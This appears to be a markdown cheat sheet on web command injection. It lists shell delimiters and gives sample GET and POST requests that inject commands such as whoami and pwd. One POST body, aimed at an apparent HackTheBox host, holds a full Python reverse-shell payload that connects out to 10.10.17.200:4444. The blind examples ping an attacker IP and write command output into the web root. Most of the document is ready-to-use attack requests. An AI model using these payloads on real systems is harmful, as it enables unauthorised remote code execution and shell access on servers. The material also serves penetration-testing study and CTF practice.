# Command Injection
## Website Request
TL;DR passing stuff to a system shell is bad
We can use a *Delimeter* to **break** out of the current line of logic to start our own

| Delimeter list |
|    :---:	|
|	&  		 |
|	;	  |
| 0x0a or \n|
| &&		|
| &#124;  |
| &#124;&#124;  |
| $(cmd)	|


Example list:
- [Get Parameter](#Get-Param)
- [Post Parameter](#Post-Param)
- [Get Parameter blind](#Get-Param-Blind)
- [Post Parameter blind](#Get-Param-Blind)

### <a name="Get-Param"></a> Get Parameter
Request
```
curl http://examplewebsite.com/bruh.php?param=23|whoami

curl http://examplewebsite.com/bruh.php?param=23;pwd
```
Response
```
Normal site content
root

Normal site content
/var/www/html
```
### <a name="Post-Param"></a> Post Parameter
Request
```
POST /logs.php HTTP/1.1
Host: previse.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Origin: http://previse.htb
Connection: close
Referer: http://previse.htb/file_logs.php
Cookie: PHPSESSID=047geh7rnvgq04s58ts0j2101n
Upgrade-Insecure-Requests: 1

delim=comma;python+-c+'import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.17.200",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


POST /help.php HTTP/1.1
Host: down.bad
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Origin: http://down.bad
Connection: close
Referer: http://down.bad/login.php
Cookie: PHPSESSID=047geh7rnvgq04s58ts0j2101n
Upgrade-Insecure-Requests: 1

user=dave|whoami
```
Response
```
Expected Response
Reverse Shell connection

Expected Response
www-data
```
### <a name="Get-Param-Blind"></a> Get Parameter(blind)
Request
```
http://vulnerable-website/endpoint?parameter=x||ping+-c+10+attackerIP||

https://vulnerable-website/endpoint?parameter=||whoami>/var/www/images/output.txt||
```
Response
```
Expected Response
10 pings from website

Expected Response
whoami written to /var/www/images/output.txt
which is viewable from 
```
### <a name="Post-Param-Blind"></a> Post Parameter(blind)
Same methods for get param blind but in a post request
